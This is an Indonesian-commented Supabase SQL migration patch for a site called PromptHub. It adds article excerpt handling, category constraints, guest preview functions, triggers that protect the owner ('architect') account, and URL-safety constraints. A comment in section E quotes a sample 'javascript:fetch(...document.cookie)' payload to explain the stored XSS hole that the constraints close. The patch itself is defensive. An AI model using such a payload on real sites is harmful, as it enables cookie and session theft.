-- ============================================================
-- PATCH v5.4 — PromptHub
-- Supabase Dashboard -> SQL Editor -> New query -> tempel semua -> Run
-- Aman dijalankan berulang kali (idempotent).
--
-- Prasyarat: v5_up + v5.1 + v5.2 + v5.3 sudah pernah dijalankan.
--
-- Isi patch ini:
--   A. Kolom & index artikel yang dipakai tampilan baru
--   B. Rapikan kategori artikel supaya tidak ada artikel "hilang"
--   C. Preview untuk tamu di Homepage ikut mengirim ringkasan
--   D. CELAH KEAMANAN: akun architect bisa dinonaktifkan/dihapus admin lain
--   E. CELAH KEAMANAN: kolom link bisa diisi "javascript:..." dari panel
--   F. Verifikasi
-- ============================================================


-- ════════════════════════════════════════════════════════════
-- BAGIAN A — KOLOM & INDEX ARTIKEL
--
-- Panel selalu mengirim updated_at saat menyimpan artikel. Kalau
-- kolomnya belum ada, seluruh penyimpanan gagal — dan sampai v5.3
-- kegagalan itu tidak pernah ditampilkan ke admin, jadi terlihat
-- seperti "sudah tersimpan tapi tidak muncul di web user".
-- ════════════════════════════════════════════════════════════

ALTER TABLE articles ADD COLUMN IF NOT EXISTS updated_at            TIMESTAMPTZ DEFAULT now();
ALTER TABLE articles ADD COLUMN IF NOT EXISTS external_url          TEXT DEFAULT '';
ALTER TABLE articles ADD COLUMN IF NOT EXISTS external_button_label TEXT DEFAULT 'Kunjungi Website';
ALTER TABLE articles ADD COLUMN IF NOT EXISTS thumbnail_url         TEXT DEFAULT '';

-- Kolom ringkasan. Web user v5.4 TIDAK lagi menarik seluruh isi artikel
-- untuk daftar kartu — hanya kolom ini. Itu penghematan egress terbesar
-- di sisi database, jadi kolom ini wajib terisi.
ALTER TABLE articles ADD COLUMN IF NOT EXISTS excerpt TEXT;

-- Isi otomatis untuk artikel yang sudah ada
UPDATE articles
SET excerpt = left(btrim(regexp_replace(regexp_replace(COALESCE(content, ''), '[#>*_`~\[\]()-]+', ' ', 'g'), '\s+', ' ', 'g')), 180)
WHERE (excerpt IS NULL OR btrim(excerpt) = '')
  AND COALESCE(content, '') <> '';

-- Dan isi otomatis setiap kali admin menyimpan, kalau dikosongkan
CREATE OR REPLACE FUNCTION fill_article_excerpt()
RETURNS TRIGGER AS $$
DECLARE
  need_refresh BOOLEAN := false;
BEGIN
  IF NEW.excerpt IS NULL OR btrim(NEW.excerpt) = '' THEN
    need_refresh := true;
  ELSIF TG_OP = 'UPDATE'
        AND NEW.content IS DISTINCT FROM OLD.content
        AND NEW.excerpt IS NOT DISTINCT FROM OLD.excerpt THEN
    -- Isi artikel diubah tapi ringkasan tidak disentuh -> ikut diperbarui
    need_refresh := true;
  END IF;

  IF need_refresh THEN
    NEW.excerpt := left(
      btrim(regexp_replace(regexp_replace(COALESCE(NEW.content, ''), '[#>*_`~\[\]()-]+', ' ', 'g'), '\s+', ' ', 'g')),
      180);
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

DROP TRIGGER IF EXISTS trg_fill_article_excerpt ON articles;
CREATE TRIGGER trg_fill_article_excerpt
  BEFORE INSERT OR UPDATE ON articles
  FOR EACH ROW EXECUTE FUNCTION fill_article_excerpt();

CREATE INDEX IF NOT EXISTS idx_articles_listing
  ON articles (category, is_published, created_at DESC);


-- ════════════════════════════════════════════════════════════
-- BAGIAN B — KATEGORI ARTIKEL
--
-- Web user hanya membaca category = 'info-ai' dan 'tips'. Sampai
-- sekarang kolom ini bebas isi, jadi satu typo membuat artikel
-- tersimpan rapi di panel tapi tidak pernah muncul di web user.
-- Nilai yang menyimpang dirapikan dulu, baru dikunci constraint.
-- ════════════════════════════════════════════════════════════

UPDATE articles SET category = lower(btrim(category)) WHERE category IS DISTINCT FROM lower(btrim(category));

UPDATE articles SET category = 'tips'
  WHERE category IN ('tip', 'tips-trik', 'tips & trik', 'tips-and-trik', 'trik', 'hack', 'tips-hack');

UPDATE articles SET category = 'info-ai'
  WHERE category IN ('info', 'infoai', 'info_ai', 'info ai', 'berita', 'news', 'artikel');

-- Sisa nilai tak dikenal dipindah ke info-ai supaya tetap terlihat,
-- bukan dihapus. Cek daftarnya di Bagian F kalau ada yang aneh.
UPDATE articles SET category = 'info-ai'
  WHERE category IS NULL OR category NOT IN ('info-ai', 'tips');

ALTER TABLE articles DROP CONSTRAINT IF EXISTS articles_category_check;
ALTER TABLE articles ADD CONSTRAINT articles_category_check
  CHECK (category IN ('info-ai', 'tips'));


-- ════════════════════════════════════════════════════════════
-- BAGIAN C — PREVIEW TAMU DI HOMEPAGE
--
-- public_tips_preview() dulu hanya mengirim judul + thumbnail, jadi
-- kartu Tips di Home terlihat kosong untuk pengunjung yang belum
-- login. Sekarang ikut mengirim ringkasan pendek (tetap tanpa
-- prompt_data dan tanpa tool_url).
--
-- public_home_preview() batasnya dinaikkan: dengan LIMIT 12 lama,
-- project trending bisa terpotong kalau sort_order-nya besar,
-- sehingga tampilan tamu berbeda dari tampilan setelah login.
-- ════════════════════════════════════════════════════════════

DROP FUNCTION IF EXISTS public_tips_preview();

CREATE FUNCTION public_tips_preview()
RETURNS TABLE (
  id            UUID,
  title         TEXT,
  thumbnail_url TEXT,
  excerpt       TEXT,
  created_at    TIMESTAMPTZ
)
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT a.id,
         a.title,
         a.thumbnail_url,
         COALESCE(
           NULLIF(btrim(a.excerpt), ''),
           left(regexp_replace(COALESCE(a.content, ''), '\s+', ' ', 'g'), 160)
         ) AS excerpt,
         a.created_at
  FROM articles a
  WHERE a.is_published = true AND a.category = 'tips'
  ORDER BY a.created_at DESC
  LIMIT 3;
$$;

CREATE OR REPLACE FUNCTION public_home_preview()
RETURNS TABLE (
  id             UUID,
  title          TEXT,
  thumbnail_url  TEXT,
  aspect_ratio   TEXT,
  content_type   TEXT,
  category_name  TEXT,
  is_featured    BOOLEAN,
  is_trending    BOOLEAN,
  sort_order     INTEGER,
  trending_order INTEGER
)
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT p.id, p.title, p.thumbnail_url, p.aspect_ratio, p.content_type,
         c.name, p.is_featured, p.is_trending, p.sort_order, p.trending_order
  FROM projects p
  LEFT JOIN categories c ON c.id = p.category_id
  WHERE p.is_published = true
    AND (p.is_featured = true OR p.is_trending = true)
  ORDER BY p.sort_order ASC, p.created_at DESC
  LIMIT 24;
$$;

REVOKE ALL ON FUNCTION public_tips_preview() FROM PUBLIC;
REVOKE ALL ON FUNCTION public_home_preview() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public_tips_preview() TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public_home_preview() TO anon, authenticated;


-- ════════════════════════════════════════════════════════════
-- BAGIAN D — CELAH KEAMANAN: AKUN ARCHITECT BISA DIKUNCI ADMIN LAIN
--
-- Patch v5.3 sudah menutup kenaikan role. Yang belum tertutup:
-- policy "profiles_update_admin" mengizinkan admin ber-izin
-- can_manage_users mengubah BARIS SIAPA PUN, termasuk baris
-- architect. Role memang tidak bisa diubah, tetapi admin tersebut
-- masih bisa menyetel is_active = false pada akun architect dan
-- mengunci pemilik sistem keluar dari panelnya sendiri.
--
-- Perbaikan: baris milik architect hanya boleh disentuh architect.
-- ════════════════════════════════════════════════════════════

CREATE OR REPLACE FUNCTION guard_profile_privilege_change()
RETURNS TRIGGER AS $$
DECLARE
  actor_role TEXT;
  old_active TEXT;
  new_active TEXT;
BEGIN
  -- service_role (Edge Function) dan SQL Editor tidak punya auth.uid().
  -- Sengaja dilewati supaya pemilik selalu punya jalan perbaikan manual.
  IF auth.uid() IS NULL THEN
    RETURN NEW;
  END IF;

  SELECT role INTO actor_role FROM profiles WHERE id = auth.uid();

  -- Architect boleh mengubah apa saja
  IF actor_role = 'architect' THEN
    RETURN NEW;
  END IF;

  -- BARU v5.4: baris architect terkunci untuk selain architect,
  -- termasuk perubahan is_active, display_name, dan avatar.
  IF OLD.role = 'architect' THEN
    RAISE EXCEPTION 'Ditolak: akun architect hanya boleh diubah oleh architect.';
  END IF;

  -- Role TIDAK BOLEH berubah, termasuk role sendiri
  IF NEW.role IS DISTINCT FROM OLD.role THEN
    RAISE EXCEPTION 'Ditolak: hanya architect yang boleh mengubah role akun.';
  END IF;

  -- is_active hanya boleh diubah admin yang punya izin kelola user
  old_active := to_jsonb(OLD) ->> 'is_active';
  new_active := to_jsonb(NEW) ->> 'is_active';
  IF new_active IS DISTINCT FROM old_active
     AND NOT has_admin_permission('can_manage_users') THEN
    RAISE EXCEPTION 'Ditolak: tidak punya izin mengubah status aktif akun.';
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;

DROP TRIGGER IF EXISTS trg_guard_profile_privilege ON profiles;
CREATE TRIGGER trg_guard_profile_privilege
  BEFORE UPDATE ON profiles
  FOR EACH ROW EXECUTE FUNCTION guard_profile_privilege_change();


-- Penghapusan akun architect juga dikunci. Tombol hapus memang sudah
-- disembunyikan di panel, tapi itu hanya tampilan — Edge Function
-- admin-delete-user tetap bisa dipanggil langsung dari luar panel.
CREATE OR REPLACE FUNCTION guard_profile_delete()
RETURNS TRIGGER AS $$
DECLARE
  actor_role TEXT;
BEGIN
  IF OLD.role IS DISTINCT FROM 'architect' THEN
    RETURN OLD;
  END IF;

  SELECT role INTO actor_role FROM profiles WHERE id = auth.uid();
  IF actor_role = 'architect' THEN
    RETURN OLD;
  END IF;

  RAISE EXCEPTION 'Ditolak: akun architect tidak boleh dihapus lewat jalur ini.';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;

DROP TRIGGER IF EXISTS trg_guard_profile_delete ON profiles;
CREATE TRIGGER trg_guard_profile_delete
  BEFORE DELETE ON profiles
  FOR EACH ROW EXECUTE FUNCTION guard_profile_delete();

-- Catatan: kalau suatu hari kamu memang ingin menghapus akun
-- architect sendiri lewat dashboard, matikan dulu penjaganya:
--   ALTER TABLE profiles DISABLE TRIGGER trg_guard_profile_delete;
--   ... hapus akunnya ...
--   ALTER TABLE profiles ENABLE TRIGGER trg_guard_profile_delete;


-- ════════════════════════════════════════════════════════════
-- BAGIAN E — CELAH KEAMANAN: LINK BERBAHAYA DARI PANEL
--
-- Kolom link diisi manual dari panel lalu dipasang apa adanya ke
-- atribut href / window.open di web user. Isi seperti
-- "javascript:fetch('https://...'+document.cookie)" akan dijalankan
-- browser saat pengunjung mengklik banner atau tombol sumber.
--
-- Sisi tampilan sudah disaring di kode v5.4. Di sini dipasang kunci
-- kedua di database. Constraint dibuat NOT VALID supaya baris lama
-- tidak membuat script gagal; aturan tetap berlaku penuh untuk
-- setiap penyimpanan baru dari panel.
-- ════════════════════════════════════════════════════════════

ALTER TABLE articles DROP CONSTRAINT IF EXISTS articles_external_url_safe;
ALTER TABLE articles ADD CONSTRAINT articles_external_url_safe
  CHECK (external_url IS NULL OR external_url = '' OR external_url ~* '^https?://') NOT VALID;

ALTER TABLE hero_slides DROP CONSTRAINT IF EXISTS hero_slides_link_safe;
ALTER TABLE hero_slides ADD CONSTRAINT hero_slides_link_safe
  CHECK (link_to IS NULL OR link_to = '' OR link_to ~* '^(https?://|/)') NOT VALID;

ALTER TABLE popup_banners DROP CONSTRAINT IF EXISTS popup_link_url_safe;
ALTER TABLE popup_banners ADD CONSTRAINT popup_link_url_safe
  CHECK (link_url IS NULL OR link_url = '' OR link_url ~* '^https?://') NOT VALID;

ALTER TABLE projects DROP CONSTRAINT IF EXISTS projects_tool_url_safe;
ALTER TABLE projects ADD CONSTRAINT projects_tool_url_safe
  CHECK (tool_url IS NULL OR tool_url = '' OR tool_url ~* '^https?://') NOT VALID;


-- ════════════════════════════════════════════════════════════
-- BAGIAN G — HEMAT USAGE (egress & storage)
--
-- Gambar adalah penyumbang egress terbesar. Mulai v5.4 setiap upload
-- baru dari panel otomatis dikecilkan, dikonversi ke WebP, dan diberi
-- cache 1 tahun. Blok di bawah membereskan file yang SUDAH terlanjur
-- diupload sebelum v5.4 supaya ikut di-cache browser dan CDN.
-- ════════════════════════════════════════════════════════════

UPDATE storage.objects
SET metadata = jsonb_set(COALESCE(metadata, '{}'::jsonb), '{cacheControl}', '"max-age=31536000"')
WHERE bucket_id = 'media'
  AND COALESCE(metadata ->> 'cacheControl', '') <> 'max-age=31536000';

-- Analytics tumbuh terus dan tidak pernah dibaca lagi setelah lewat
-- beberapa bulan. Simpan 90 hari terakhir saja.
DELETE FROM analytics WHERE created_at < now() - interval '90 days';


-- ── Diagnostik (jalankan terpisah, semuanya hanya membaca) ──────────
--
-- G1. File paling besar di Storage — target pertama untuk dikecilkan
--   SELECT name, round((metadata->>'size')::numeric/1024) AS kb
--   FROM storage.objects WHERE bucket_id = 'media'
--   ORDER BY (metadata->>'size')::numeric DESC LIMIT 20;
--
-- G2. File yatim: sudah tidak dipakai baris mana pun. Catat namanya,
--     lalu hapus lewat Dashboard -> Storage -> media.
--   SELECT o.name, round((o.metadata->>'size')::numeric/1024) AS kb
--   FROM storage.objects o
--   WHERE o.bucket_id = 'media'
--     AND NOT EXISTS (SELECT 1 FROM projects       p WHERE p.thumbnail_url LIKE '%' || o.name)
--     AND NOT EXISTS (SELECT 1 FROM articles       a WHERE a.thumbnail_url LIKE '%' || o.name)
--     AND NOT EXISTS (SELECT 1 FROM hero_slides    h WHERE h.image_url     LIKE '%' || o.name)
--     AND NOT EXISTS (SELECT 1 FROM popup_banners  b WHERE b.image_url     LIKE '%' || o.name)
--     AND NOT EXISTS (SELECT 1 FROM categories     c WHERE c.icon          LIKE '%' || o.name)
--     AND NOT EXISTS (SELECT 1 FROM site_settings  s WHERE s.logo_url      LIKE '%' || o.name)
--   ORDER BY (o.metadata->>'size')::numeric DESC;
--
-- G3. Ukuran prompt_data per project
--   SELECT title, pg_column_size(prompt_data) AS bytes
--   FROM projects ORDER BY 2 DESC LIMIT 10;
--
-- G4. Total ukuran bucket media
--   SELECT round(sum((metadata->>'size')::numeric)/1048576, 1) AS total_mb
--   FROM storage.objects WHERE bucket_id = 'media';


-- ============================================================
-- BAGIAN F — VERIFIKASI (jalankan terpisah setelah Run selesai)
-- ============================================================
--
-- 1) Kolom artikel sudah lengkap — harus keluar 5 baris
--    SELECT column_name FROM information_schema.columns
--    WHERE table_name = 'articles'
--      AND column_name IN ('updated_at','external_url','external_button_label','thumbnail_url','excerpt');
--
-- 2) Semua artikel berada di kategori yang dikenali web user
--    SELECT category, count(*) FROM articles GROUP BY category;
--    -- hanya boleh muncul 'info-ai' dan 'tips'
--
-- 3) Preview tamu sudah mengirim ringkasan
--    SELECT * FROM public_tips_preview();
--
-- 4) Penjaga akun architect aktif — harus keluar 2 baris
--    SELECT tgname FROM pg_trigger
--    WHERE tgrelid = 'profiles'::regclass
--      AND tgname IN ('trg_guard_profile_privilege','trg_guard_profile_delete');
--
-- 5) Pastikan architect hanya akunmu
--    SELECT id, display_name, role FROM profiles WHERE role = 'architect';
--
-- ============================================================
-- SELESAI
-- ============================================================
